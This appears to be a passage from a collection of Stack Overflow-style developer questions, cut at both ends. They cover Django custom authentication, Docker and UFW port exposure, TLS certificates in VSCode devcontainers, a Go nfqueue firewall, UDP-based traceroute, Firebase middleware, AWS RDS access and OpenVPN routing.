Django Version:     5.0.2
Exception Type:     ProgrammingError
Exception Value:    

no existe la relación «core_user»
LINE 1: SELECT 1 AS &quot;a&quot; FROM &quot;core_user&quot; WHERE &quot;core_user&quot;.&quot;email&quot; =...
</code></pre>
<p>My files have the following configuration</p>
<p>models.py</p>
<pre><code>from django.db import models
from django.contrib.auth.models import AbstractUser

class User(AbstractUser):
    email = models.EmailField(unique=True)
    USERNAME_FIELD = 'email'
    REQUIRED_FIELDS = ['username']

class Task(models.Model):
    user = models.ForeignKey(User, on_delete=models.CASCADE)
    title = models.CharField(max_length=200)
    description = models.TextField()
    complete = models.BooleanField(default=False)
    created = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return self.title

    class Meta:
        ordering = ['complete']

</code></pre>
<p>views.py</p>
<pre><code>from django.shortcuts import render, redirect
from django.views.generic import ListView, DetailView, CreateView, UpdateView, DeleteView, FormView

from django.urls import reverse_lazy

from django.contrib.auth.views import LoginView
from django.contrib.auth.mixins import LoginRequiredMixin

from django.contrib.auth import login

from .models import Task
from .forms import LoginForm, RegisterForm

class CustomLoginView(LoginView):
    template_name = 'core/login.html'
    form_class = LoginForm
    redirect_authenticated_user = True

    def get_success_url(self):
        return reverse_lazy('task_list')

class RegisterPage(FormView):
    template_name = 'core/register.html'
    form_class = RegisterForm
    redirect_authenticated_user = True
    success_url = reverse_lazy('task_list')

    def form_valid(self, form):
        user = form.save()
        if user is not None:
            login(self.request, user)
        return super(RegisterPage, self).form_valid(form)

    def get(self, *args, **kwargs):
        if self.request.user.is_authenticated:
            return redirect('task_list')
        return super(RegisterPage, self).get(*args, **kwargs)

class TaskList(LoginRequiredMixin, ListView):
    model = Task
    template_name = 'core/index.html'
    context_object_name = 'task_list'

    def get_context_data(self, **kwargs):
        context = super().get_context_data(**kwargs)
        context['task_list'] = context['task_list'].filter(user=self.request.user)
        context['count'] = context['task_list'].filter(complete=False).count()

        search_input = self.request.GET.get('search-area') or ''
        if search_input:
            context['task_list'] = context['task_list'].filter(title__startswith=search_input)

        context['search_input'] = search_input

        return context

class TaskDetail(LoginRequiredMixin, DetailView):
    model = Task
    template_name = 'core/task_detail.html'
    context_object_name = 'task'

class TaskCreate(LoginRequiredMixin, CreateView):
    model = Task
    template_name = 'core/task_form.html'
    fields = ['title', 'description', 'complete']
    success_url = reverse_lazy('task_list')

    def form_valid(self, form):
        form.instance.user = self.request.user
        return super(TaskCreate, self).form_valid(form)

class TaskUpdate(LoginRequiredMixin, UpdateView):
    model = Task
    fields = ['title', 'description', 'complete']
    success_url = reverse_lazy('task_list')

class TaskDelete(LoginRequiredMixin, DeleteView):
    model = Task
    context_object_name = 'task'
    success_url = reverse_lazy('task_list')
</code></pre>
<p>forms.py</p>
<pre><code>from django.contrib.auth.forms import UserCreationForm, AuthenticationForm
from django.contrib.auth import get_user_model
from django import forms


class RegisterForm(UserCreationForm):
    class Meta:
        model = get_user_model()
        fields = ('email', 'password1', 'password2')


class LoginForm(AuthenticationForm):
    username = forms.CharField(label='Email')

    def clean(self):
        username = self.cleaned_data.get('username')
        password = self.cleaned_data.get('password')

        # Verificar si el nombre de usuario es un correo electrónico
        if '@' in username:
            kwargs = {'email': username}

        # Asignar los datos limpios validados al formulario
        self.cleaned_data['username'] = username
        self.cleaned_data['password'] = password
        return super().clean()
</code></pre>
<p>backends.py</p>
<pre><code>from django.contrib.auth.hashers import check_password
from django.contrib.auth.backends import ModelBackend
from django.contrib.auth import get_user_model
from django.db.models import Q

UserModel = get_user_model()

class EmailBackend(ModelBackend):
    def authenticate(self, request, username=None, password=None, **kwargs):
        try:
            user = UserModel.objects.get(Q(username__iexact=username) | Q(email__iexact=username))
        except UserModel.DoesNotExist:
            return None
        except UserModel.MultipleObjectsReturned:
            # Podrías manejar este caso de manera más específica si es necesario
            user = UserModel.objects.filter(Q(username__iexact=username) | Q(email__iexact=username)).order_by('id').first()

        if user and check_password(password, user.password):
            return user
        else:
            return None

</code></pre>
<p>settings.py</p>
<pre><code>&quot;&quot;&quot;
Django settings for todolist_project project.

Generated by 'django-admin startproject' using Django 5.0.2.

For more information on this file, see
https://docs.djangoproject.com/en/5.0/topics/settings/

For the full list of settings and their values, see
https://docs.djangoproject.com/en/5.0/ref/settings/
&quot;&quot;&quot;

from pathlib import Path
from decouple import config

# Build paths inside the project like this: BASE_DIR / 'subdir'.
BASE_DIR = Path(__file__).resolve().parent.parent


# Quick-start development settings - unsuitable for production
# See https://docs.djangoproject.com/en/5.0/howto/deployment/checklist/

# SECURITY WARNING: keep the secret key used in production secret!
SECRET_KEY = 'django-insecure-0blmoc@*qb)vl*b++oj$akhq!3@s^dhbq3u89nt3ap(%0%thd9'

# SECURITY WARNING: don't run with debug turned on in production!
DEBUG = True

ALLOWED_HOSTS = []

AUTHENTICATION_BACKENDS = [
    'core.backends.EmailBackend',  # Personalización para permitir inicio de sesión con email
]

# Personalización de la autenticación para permitir inicio de sesión con email
AUTH_USER_MODEL = 'core.User'

# Application definition

INSTALLED_APPS = [
    'django.contrib.admin',
    'django.contrib.auth',
    'django.contrib.contenttypes',
    'django.contrib.sessions',
    'django.contrib.messages',
    'django.contrib.staticfiles',
    'core.apps.CoreConfig',
]

MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
]

ROOT_URLCONF = 'todolist_project.urls'

TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [],
        'APP_DIRS': True,
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.debug',
                'django.template.context_processors.request',
                'django.contrib.auth.context_processors.auth',
                'django.contrib.messages.context_processors.messages',
            ],
        },
    },
]

WSGI_APPLICATION = 'todolist_project.wsgi.application'


# Database
# https://docs.djangoproject.com/en/5.0/ref/settings/#databases

DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME': config('DB_NAME'),
        'USER': config('DB_USER'),
        'PASSWORD': config('DB_PASSWORD'),
        'HOST': config('DB_HOST'),
        'PORT': config('DB_PORT'),
    }
}


# Password validation
# https://docs.djangoproject.com/en/5.0/ref/settings/#auth-password-validators

AUTH_PASSWORD_VALIDATORS = [
    {
        'NAME': 'django.contrib.auth.password_validation.UserAttributeSimilarityValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.MinimumLengthValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.CommonPasswordValidator',
    },
    {
        'NAME': 'django.contrib.auth.password_validation.NumericPasswordValidator',
    },
]

AUTHENTICATION_BACKENDS = [
    'core.backends.EmailBackend',  # Personalización para permitir inicio de sesión con email
]

# Personalización de la autenticación para permitir inicio de sesión con email
AUTH_USER_MODEL = 'core.User'

# Internationalization
# https://docs.djangoproject.com/en/5.0/topics/i18n/

LANGUAGE_CODE = 'en-us'

TIME_ZONE = 'UTC'

USE_I18N = True

USE_TZ = True

LOGIN_URL = 'login'

# Static files (CSS, JavaScript, Images)
# https://docs.djangoproject.com/en/5.0/howto/static-files/

STATIC_URL = '/static/'

# Default primary key field type
# https://docs.djangoproject.com/en/5.0/ref/settings/#default-auto-field

DEFAULT_AUTO_FIELD = 'django.db.models.BigAutoField'

</code></pre>
<p>I want to be able to login and register correctly, without using the username, using email and password.</p>
"
"<p>My dockerized server is visible to the internet even though I've set UFW to not allow anything but ssh and http.</p>
<p>I've read that docker opens the ports via the ip-tables and bypasses UFW.</p>
<p>I do not want the server accessible via its port. Instead I use an nginx proxy to allow this access.</p>
<p>Furthermore, I have a dockerize mongo database that I only want to be accessible by my server app.  It too is accessible from the outside.</p>
<p>docker compose file snippet</p>
<pre><code>  myapp:
    restart: unless-stopped
    build:
      context: ../server
      dockerfile: Dockerfile
    hostname: myapp
    ports:
      - 28000:27000
  mongo_service:
    restart: unless-stopped
    image: mongo
    ports:
      - 27017:27017
</code></pre>
<p>UFW status</p>
<pre><code>$ sudo ufw status verbose
Status: active
Logging: on (low)
Default: deny (incoming), allow (outgoing), deny (routed)
New profiles: skip

To                         Action      From
--                         ------      ----
22/tcp                     ALLOW IN    10.137.0.0/16             
80/tcp                     ALLOW IN    Anywhere                  
443/tcp                    ALLOW IN    Anywhere                  
123/udp                    ALLOW IN    Anywhere                  
80/tcp (v6)                ALLOW IN    Anywhere (v6)             
443/tcp (v6)               ALLOW IN    Anywhere (v6)             
123/udp (v6)               ALLOW IN    Anywhere (v6)  
</code></pre>
<p>From the outside I can access either 28000 or 27017</p>
<pre><code>curl -v telnet://145.132.124.138:28000
</code></pre>
<p>This reports:</p>
<p>Connected to 145.132.124 port 28000 (#0)</p>
<p>Just to restate the requirements.  The server app is the only entity that should be able to access the mongo db. The only access to the server app should be via port 80/443 directed through a proxy to the local port 28000.  Neither port 28000 nor 27017 should be visible outside the host.</p>
<p>NOTE: I do block access via a cloud firewall. I just want the rules in UFW to make sense and do what they appear to be attempting.</p>
<p>NOTE2: I tried adding DOCKER_OPTS=&quot;--iptables=false&quot; to the /etc/default/docker  and restarted sudo systemctl restart docker but this did not resolve the issue. The connections could still be made.</p>
"
"<p>My corporate firewall is breaking TLS/SSL connections. I'd like to add a root certifiate to VSCode trust store. Is it possible?</p>
<p>Not of the below settings seem to affect devcontainers HTTP connections:</p>
<pre><code>&quot;http.experimental.systemCertificatesV2&quot;: false
&quot;http.systemCertificates&quot;: false
&quot;http.proxyStrictSSL&quot;: false
</code></pre>
<p><strong>.devcontainer.json</strong></p>
<pre><code>{
    &quot;features&quot;: {
        &quot;ghcr.io/devcontainers/features/java:1&quot;: {
           &quot;installMaven&quot;: &quot;true&quot;
       }
     },

    &quot;name&quot;: &quot;Java&quot;,
    &quot;image&quot;: &quot;mcr.microsoft.com/devcontainers/java:1-21-bullseye&quot;
}
</code></pre>
<p><strong>Error:</strong></p>
<pre><code>Resolving Feature dependencies for 'ghcr.io/devcontainers/features/java:1'...
* Processing feature: ghcr.io/devcontainers/features/java:1
Error: self signed certificate in certificate chain
    at TLSSocket.onConnectSecure (node:_tls_wrap:1553:34)
    at TLSSocket.emit (node:events:514:28)
    at TLSSocket._finishInit (node:_tls_wrap:970:8)
    at TLSWrap.onhandshakedone (node:_tls_wrap:746:12)
</code></pre>
"
"<p>Given I have this create user view</p>
<pre><code>class UserView(View):
    def post(self, request):
        try:
            data = json.loads(request.body)
            encrypted_username_hex = data.get('username', None)
            encrypted_password_hex = data.get('password', None)
            phone_number = data.get('phone_number', None)
            email = data.get('email', None)

            missing_fields = [field for field in ['username', 'password', 'email'] if data.get(field) is None]
            if missing_fields:
                return JsonResponse({&quot;error&quot;: f&quot;Missing required field(s): {', '.join(missing_fields)}&quot;}, status=400)

            session_id = request.session.session_key
            print(&quot;user create ses&quot;, session_id)
            private_key_pem, _ = RSAKeyManager.get_keys(session_id)
            if not private_key_pem:
                return JsonResponse({&quot;error&quot;: &quot;Invalid session or RSA keys not found&quot;}, status=404)
            print(&quot;private key&quot;, private_key_pem)
            username = RSAHandler.decrypt_from_hex(private_key_pem, encrypted_username_hex)
            password = RSAHandler.decrypt_from_hex(private_key_pem, encrypted_password_hex)

            user = CustomUser.objects.create_user(username=username, email=email, password=password,
                                                  phone_number=phone_number)

            return JsonResponse({&quot;user&quot;: user.email, &quot;phone_number&quot;: user.phone_number}, status=201)

        except IntegrityError as e:
            if 'username' in str(e):
                return JsonResponse({&quot;error&quot;: &quot;This username is already taken.&quot;}, status=400)
            elif 'email' in str(e):
                return JsonResponse({&quot;error&quot;: &quot;This email is already in use.&quot;}, status=400)
            else:
                return JsonResponse({&quot;error&quot;: &quot;There was an error with your request.&quot;}, status=400)

        except ValidationError as e:
            return JsonResponse({&quot;error&quot;: str(e.messages[0])}, status=400)

        except Exception as e:
            traceback.print_exc()
            return JsonResponse({&quot;error&quot;: &quot;Internal server error.&quot;}, status=500)
</code></pre>
<p>And this custom user model:</p>
<pre><code>class CustomUserManager(BaseUserManager):
    def create_user(self, username, email, password=None, phone_number=None, **extra_fields):
        if not email:
            raise ValueError(_('The Email must be set'))
        email = self.normalize_email(email)
        user = self.model(username=username, email=email, phone_number=phone_number, **extra_fields)
        user.set_password(password)
        user.save(using=self._db)
        return user

    def create_superuser(self, username, email, password=None, phone_number=None, **extra_fields):
        extra_fields.setdefault('is_staff', True)
        extra_fields.setdefault('is_superuser', True)

        if extra_fields.get('is_staff') is not True:
            raise ValueError(_('Superuser must have is_staff=True.'))
        if extra_fields.get('is_superuser') is not True:
            raise ValueError(_('Superuser must have is_superuser=True.'))

        return self.create_user(username, email, password, phone_number, **extra_fields)

class CustomUser(AbstractBaseUser, PermissionsMixin):
    username = models.CharField(max_length=150, unique=True)
    email = models.EmailField(unique=True)
    phone_number = models.CharField(max_length=15, blank=True, null=True)
    is_staff = models.BooleanField(default=False)
    is_active = models.BooleanField(default=True)
    banned = models.BooleanField(default=False)
    created_at = models.DateTimeField(default=timezone.now)
    updated_at = models.DateTimeField(auto_now=True)

    USERNAME_FIELD = 'email'
    REQUIRED_FIELDS = ['username', &quot;password&quot;]

    objects = CustomUserManager()

    # Add related_name to groups and user_permissions fields
    groups = models.ManyToManyField(
        'auth.Group',
        verbose_name=_('groups'),
        blank=True,
        help_text=_('The groups this user belongs to. A user will get all permissions granted to each of their groups.'),
        related_name=&quot;custom_user_set&quot;,  # Changed related_name
        related_query_name=&quot;user&quot;,
    )
    user_permissions = models.ManyToManyField(
        'auth.Permission',
        verbose_name=_('user permissions'),
        blank=True,
        help_text=_('Specific permissions for this user.'),
        related_name=&quot;custom_user_set&quot;,  # Changed related_name
        related_query_name=&quot;user&quot;,
    )

    def __str__(self):
        return self.username
</code></pre>
<p>And this login view:</p>
<pre><code>
class LoginView(View):

    def post(self, request):
        try:
            data = json.loads(request.body)
            email = data.get('email', None)
            encrypted_password_hex = data.get('password', None)
            session_id = request.session.session_key

            private_key_pem, _ = RSAKeyManager.get_keys(session_id)
            print(session_id)
            password = RSAHandler.decrypt_from_hex(private_key_pem, encrypted_password_hex)
            print(email)
            print(password)
            # Authenticating the user
            user = authenticate(username=email, password=password)
            user = authenticate(username='tes321t@gm3ail.com', password='test')

            print(&quot;user&quot;, user)
            if user is not None:
                # User is authenticated, now generate a JWT token
                payload = {
                    'session_id': request.session.session_key,
                    'username': user.username,
                }
                jwt_token = jwt.encode(payload, settings.SECRET_KEY, algorithm='HS256')

                return JsonResponse({&quot;token&quot;: jwt_token, &quot;user&quot;: user.username}, status=200)
            else:
                # Authentication failed
                return JsonResponse({&quot;error&quot;: &quot;Invalid credentials&quot;}, status=401)

        except Exception as e:
            return JsonResponse({&quot;error&quot;: str(e)}, status=500)
</code></pre>
<p>I cannot manage to auth,</p>
<p>I tried manually to specify user/pass but still, user is always none:</p>
<pre><code>user = authenticate(username='tes321t@gm3ail.com', password='test')
</code></pre>
<p>The user exists in the db, the password is corretly hashed it seems, the password is the same (in plain text) not sure what I m doing wrong at this point :(</p>
<p>Flow is as such -&gt;</p>
<ol>
<li>Client requests RSA pub key and ses id</li>
<li>Client sends user/create data as: encrypted password, pain text email and other fields, backend stores email and plain text hashed password(rsa decrypted) using django <code>set_password</code></li>
<li>Client requests user/login with email and rsa_encrypted_password, backend decrypts password to plain text, and calls django authenticate with plain text email/password)</li>
</ol>
<p>Even with  hardcoded data, auth still fails:</p>
<pre><code>    def get(self, request):
        try:
            random_string = str(uuid.uuid4())[:4]
            from django.contrib.auth import authenticate

            CustomUser.objects.create_user(username=random_string, email=random_string, password='test',
                                                  phone_number='test')
            user = authenticate(request, email=random_string, password='test')
            print(user)
            return JsonResponse({&quot;user&quot;: user})
        except Exception as e:
            return JsonResponse({'er': str(e)})
</code></pre>
<p>For this line i use username instead of email aswell
<code>            user = authenticate(request, username=random_string, password='test')</code>, same outcome, returns None</p>
<p>Manually checking user password (for hardcoded example, works)</p>
<pre><code>            user = CustomUser.objects.get(username=random_string)

            print(&quot;check pass&quot;, check_password('test', user.password))
</code></pre>
<p>check_password, returns True</p>
"
"<p>I'm writing a L7 firewall in golang using go-nfqueue.</p>
<p>For each packets (from a src client to a dst server) that is crossing my L7 firewall, I check the applicative content of the packet and I've to set one of the following verdicts:</p>
<ul>
<li>Accept: When the content is as expected.</li>
<li>Drop: If the content is not as expected and if my configuration is in &quot;silent&quot; mode. In that case, the src client doesn't know that its packet has been rejected, it only never receives the ack (it's TCP packets).</li>
<li>Reject: If the content is not as expected and if my configuration is in &quot;disconnect&quot; mode. In that case, the src client has to be disconnected.</li>
</ul>
<p>For the first two verdicts (accept and drop), it works fine with respectively &quot;NfAccept&quot; and &quot;NfDrop&quot;</p>
<p>But, in the libnetfilter_queue/go-nfqueue the verdict &quot;reject&quot; doesn't exist.</p>
<p>How can I reject a packet (ie. disconnect a src client) ?</p>
<p>Regards</p>
"
"<p>I am playing a game named &quot;Planetside 2&quot; and since a few days many users including me have high ping issues on a specific server, while others have not.</p>
<p>Therefore I wanted to try to traceroute / ping the Server IP, to find out which server node causes the high ping issues.</p>
<p>However it seems like the Server has some kind of Firewall that protects itself from being pinged by ICMP. Whenever I use &quot;ping 69.174.216.23&quot; (the ip is public on google so I can share it here) I get a timeout response.</p>
<p>So I used Wireshark to find out how the Game Client communicates with the Server and I found out that it's using UDP to ping the Server IP:Port.</p>
<p>However the Server has only a few Ports open for example for the Server IP: 69.174.216.23
The following ports are the only ones that it communicates with:
{ 20112, 20113, 20143, 20156, 20157, 20164, 20168, 20175 }</p>
<p>If I simulate that, sending a 1Byte UDP Packet to the Server it does not work, but if I add one of the Ports behind it 69.174.216.23:20112 and send a 1Byte UDP Packet I get a response.</p>
<p>I made a simple python script like that which works fine for that purpose:</p>
<pre><code>import socket
import time

def udp_ping(destination_ip, destination_port):
    try:
        # Create a UDP socket
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Set a timeout for receiving responses (in seconds)
        udp_socket.settimeout(5)
        
        # Record the time just before sending the message
        start_time = time.time()
        
        # Send a message to the destination
        udp_socket.sendto(b'PONG', (destination_ip, destination_port))
        
        # Receive a response
        response, address = udp_socket.recvfrom(1024)
        
        # Record the time when the response is received
        end_time = time.time()
        
        # Calculate round-trip time (RTT) in milliseconds
        rtt_ms = (end_time - start_time) * 1000
        
        print(&quot;Received response from {}: {} (RTT: {:.2f} ms)&quot;.format(address, response.decode(), rtt_ms))
    
    except socket.timeout:
        print(&quot;No response received.&quot;)

    finally:
        udp_socket.close()

destination_ip = '69.174.216.23'
destination_port = 20112 
udp_ping(destination_ip, destination_port)
</code></pre>
<p>So since I am not able to traceroute or ping the Server IP using ICMP, I wonder if there is another possible way, like using an approach like I did with udp ip:port instead?</p>
<p>I searched around a bit and found out that you can udp traceroute but that uses its probe on UDP port number 33434 and since the Targets Server IP only listens / responds to a few ports (20112, 20113, 20143, 20156, 20157, 20164, 20168, 20175).</p>
<p>So I tried it this way:</p>
<pre><code>using (UdpClient udpClient = new UdpClient())
{
    udpClient.Client.ReceiveTimeout = 3000;

    for (short ttl = 1; ttl &lt;= maxHops; ttl++)
    {
        string message = $&quot;Traceroute[{ttl}]: &quot;;

        // Set the TTL option for the UDP socket
        udpClient.Client.Ttl = ttl;

        // Send a UDP packet to the target
        udpClient.Send(new byte[1], 1, targetIp, targetPort);

        message += $&quot;UDP packet sent to {targetIp}:{targetPort}&quot;;

        try
        {
            // Receive response from the target or an intermediate router
            UdpReceiveResult result = await udpClient.ReceiveAsync();

            IPAddress senderIp = result.RemoteEndPoint.Address;

            if (senderIp.Equals(targetIp))
            {
                targetReached = true;
                message += &quot; - Target reached&quot;;
            }
            else
            {
                message += $&quot; - Received response from {senderIp}&quot;;
            }
        }
        catch (SocketException ex)
        {
            if (ex.SocketErrorCode == SocketError.TimedOut)
            {
                message += &quot; - Timeout&quot;;
            }
            else
            {
                message += $&quot; - Error: {ex.Message}&quot;;
            }
        }
        catch (Exception ex)
        {
            message += $&quot; - Error: {ex.Message}&quot;;
        }

        if (targetReached)
        {
            break;
        }
    }
}
</code></pre>
<p>However here the issue is that as soon as i set <code>udpClient.Client.Ttl = ttl;</code> it doesn't get any anymore here <code>UdpReceiveResult result = await udpClient.ReceiveAsync();</code> but if I comment the TTL out it works fine.</p>
<p>So now I am stuck and wonder if there is another possible way to traceroute the IP?</p>
<p>Doesn't matter which enviroment, linux, c#, python, powershell im fine with that, just to get an idea.</p>
"
"<p>From my frontend, I can use <code>django-allauth</code> to authenticate a new Google user with the following endpoint:</p>
<p><code>myapp.com/auth/google/</code></p>
<p>I would instead like it to authorize the account for an existing user, enabling the user to access multiple gmail accounts from my application. I presume it's possible because it seems like the models are set up to accommodate this. However, I can't find any documentation for adding a second account to an existing user through allauth's api.</p>
"
"<p>I am trying to bypass django basic auth as I want to use firebase auth on Frontend and I am only getting the id_token on Backend.</p>
<p>The Middleware is as follows:</p>
<pre><code>class FireBaseAuth(MiddlewareMixin):

    def __init__(self, get_response):
        self.get_response = get_response

    def __call__(self, request):
        modified_request = self.process_request(request)
        response = self.get_response(modified_request)
        response = self.process_response(response)
        return response

    def process_request(self, request):
        middleware = &quot;[FireBase Auth]&quot;
        logger.info(f&quot;{middleware} Request path: {request.path}&quot;)
        if request.path.rstrip('/').split('/')[-1] in EXCLUDE_AUTH_ENDPOINTS:
            logger.info(
                f&quot;{middleware} Skipping auth check for: {request.path}&quot;)
            return request

        token = request.META.get(&quot;HTTP_FB_ACCESS_TOKEN&quot;)
        if not token:
            logger.info(f&quot;{middleware} No token found&quot;)
            return HttpResponse(&quot;Unauthorized&quot;,
                                status=status.HTTP_401_UNAUTHORIZED)
        # check if token is valid
        try:
            fb_user = auth.verify_id_token(token)
            if not fb_user:
                logger.info(f&quot;{middleware} No info found against token&quot;)
                return HttpResponse(&quot;Unauthorized&quot;,
                                    status=status.HTTP_401_UNAUTHORIZED)
            if fb_user:
                # Fetch user Data
                fb_user = auth.get_user_by_email(fb_user['email'])
                if not fb_user.email_verified:
                    logger.info(f&quot;{middleware} User email not verified&quot;)
                    return HttpResponse(&quot;User email not verified&quot;,
                                        status=status.HTTP_401_UNAUTHORIZED)

                logger.info(
                    f&quot;{middleware} Got user[{fb_user.email}] from firebase&quot;)

                # Check if user exists in current region
                user = User.objects.filter(email=fb_user.email).first()
                # Create user if not exists
                if not user:
                    logger.info(f&quot;{middleware} User not Found&quot;)
                    return HttpResponse(&quot;User email not Found&quot;,status=status.HTTP_400_BAD_REQUEST)
                logger.info(f&quot;{middleware} User Found. {user.id}&quot;)
                
                request.user = user
                setattr(request, 'user', user)
                logger.info(f&quot;{middleware} Updated request user&quot;)
            return request

        except Exception as e:
            exec_type, exce_value, exec_traceback = sys.exc_info()
            logging.error(
                repr(traceback.format_exception(exec_type,exce_value,exec_traceback)))
            return HttpResponse(f&quot;Unauthorized. &quot;f&quot;{'Token Expired' if 'expired' in str(e) else 'Invalid Token' }&quot;,status=status.HTTP_401_UNAUTHORIZED)
</code></pre>
<p>The settings File is as follows:</p>
<pre><code>MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    # 'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    'corsheaders.middleware.CorsMiddleware',
    'django.middleware.security.SecurityMiddleware',
    'ts.middleware.AddSecurityHeadersMiddleware',
    'ts.middleware.FireBaseAuth',
]
</code></pre>
<p>And the view goes like:</p>
<pre><code>class GetUserAPIView(APIView):
    &quot;&quot;&quot;
    Get user data
    &quot;&quot;&quot;
    # authentication_classes = [JWTAuthentication]
    # permission_classes = [IsAuthenticated]

    def get(self, request):
        &quot;&quot;&quot;
        Return data of user
        :param request: get request
        &quot;&quot;&quot;
        api_name = &quot; [GET: user/get_user_data] &quot;
        try:
            # device_token = request.query_params.get('device_token', &quot;&quot;)
            # device_type = request.query_params.get('device_type', &quot;&quot;)
            user = request.user
............. and goes on
</code></pre>
<p>The issue is that I'm getting request.user an Anonymous User object and the custom headers are also missing in request.</p>
<p>How do I bypass the auth middlewares that do not alter the request ?</p>
<p>I tried rearranging middlewares but it did not work.
Also, removing auth middleware is not an option. I am using django admin as well.</p>
"
"<p>I'm student and I start to explore AWS with free tier EC2 and RDS. I have a spring boot app and this is my application.properties</p>
<pre><code>server.port=8080
spring.datasource.url=jdbc:mysql://tiktok.cdo6k4mey5el.us-east-1.rds.amazonaws.com:3306/tiktok
spring.datasource.username=admin
spring.datasource.password=**********
spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect
spring.jpa.hibernate.ddl-auto=update
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver
</code></pre>
<p>When running application on my local laptop, I can connect to the RDS database and can perform CRUD actions there! However, when I deploy my app to EC2, I can not connect to MySQL on RDS!
These are my security groups for EC2 <a href=""https://i.stack.imgur.com/N8doq.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/N8doq.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/7dHnS.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/7dHnS.png"" alt=""enter image description here"" /></a></p>
<p>An this is how I set the inbound with outbound on RDS</p>
<p><a href=""https://i.stack.imgur.com/zEmKK.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/zEmKK.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/uUcnG.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/uUcnG.png"" alt=""enter image description here"" /></a>
<a href=""https://i.stack.imgur.com/0gCBr.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/0gCBr.png"" alt=""enter image description here"" /></a></p>
<p>Could anyone have experience this before or found out what I did wrong to help me figure it out? Thank you!</p>
"
"<p>I have configured a OpenVPN server in a Windows 11 system with tun connection (because tap is not supported in android app) and I have connection to it from OpenVPN Connect app but with no internet connection.
I can see outbound traffic, but no inbound.</p>
<p>I have 1995 port fordwarded and IPEnableRouter=1 from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters in the server.</p>
<p>This is the ramaining configuration:</p>
<p>server.ovpn</p>
<pre><code>port 1195
proto udp
dev tun
ca &quot;C:\\Program Files\\OpenVPN\\config\\ca.crt&quot; 
cert &quot;C:\\Program Files\\OpenVPN\\config\\server.crt&quot; 
key &quot;C:\\Program Files\\OpenVPN\\config\\server.key&quot;
dh &quot;C:\\Program Files\\OpenVPN\\config\\dh2048.pem&quot;
topology subnet
server 10.8.0.0 255.255.255.0
ifconfig-pool-persist ipp.txt
push &quot;redirect-gateway def1&quot;
push &quot;dhcp-option DNS 8.8.8.8&quot;
push &quot;dhcp-option DNS 8.8.4.4&quot;
keepalive 10 120
tls-auth ta.key 0 # This file is secret
cipher AES-256-CBC
persist-key
persist-tun
status openvpn-status.log
verb 3
explicit-exit-notify 1
</code></pre>
<p>cliente.ovpn</p>
<pre><code>client
dev tun
proto udp
remote &lt;public ip from server connected router&gt; 1195
resolv-retry infinite
nobind
persist-key
persist-tun
ca &quot;ca.crt&quot;
cert &quot;cliente.crt&quot;
key &quot;cliente.key&quot;
tls-auth &quot;ta.key&quot; 1
cipher AES-256-CBC
verb 3
</code></pre>
<p>Here it is the server log from my latest reconnect with a try of client connection:</p>
<pre><code>Wed Feb 21 19:43:53 2024 SIGHUP[hard,] received, process restarting
Wed Feb 21 19:43:53 2024 MANAGEMENT: &gt;STATE:1708541033,RECONNECTING,SIGHUP,,,,,
Wed Feb 21 19:43:53 2024 --pull-filter ignored for --mode server
Wed Feb 21 19:43:53 2024 OpenVPN 2.4.8 x86_64-w64-mingw32 [SSL (OpenSSL)] [LZO] [LZ4] [PKCS11] [AEAD] built on Oct 31 2019
Wed Feb 21 19:43:53 2024 Windows version 6.2 (Windows 8 or greater) 64bit
Wed Feb 21 19:43:53 2024 library versions: OpenSSL 1.1.0l  10 Sep 2019, LZO 2.10
Wed Feb 21 19:43:53 2024 Restart pause, 5 second(s)
Wed Feb 21 19:43:58 2024 NOTE: your local LAN uses the extremely common subnet address 192.168.0.x or 192.168.1.x.  Be aware that this might create routing conflicts if you connect to the VPN server from public locations such as internet cafes that use the same subnet.
Wed Feb 21 19:43:58 2024 Note: cannot open openvpn-status.log for WRITE
Wed Feb 21 19:43:58 2024 Note: cannot open ipp.txt for READ/WRITE
Wed Feb 21 19:43:58 2024 Diffie-Hellman initialized with 2048 bit key
Wed Feb 21 19:43:58 2024 Failed to extract curve from certificate (UNDEF), using secp384r1 instead.
Wed Feb 21 19:43:58 2024 ECDH curve secp384r1 added
Wed Feb 21 19:43:58 2024 Outgoing Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
Wed Feb 21 19:43:58 2024 Incoming Control Channel Authentication: Using 160 bit message hash 'SHA1' for HMAC authentication
Wed Feb 21 19:43:58 2024 interactive service msg_channel=548
Wed Feb 21 19:43:58 2024 open_tun
Wed Feb 21 19:43:58 2024 CreateFile failed on TAP device: \\.\Global\{994D7726-215D-4592-AE9A-1A5D7C658A3D}.tap
Wed Feb 21 19:43:58 2024 TAP-WIN32 device [Conexión de área local] opened: \\.\Global\{16C88E12-9581-46D9-86FD-A51FF83B3235}.tap
Wed Feb 21 19:43:58 2024 TAP-Windows Driver Version 9.26 
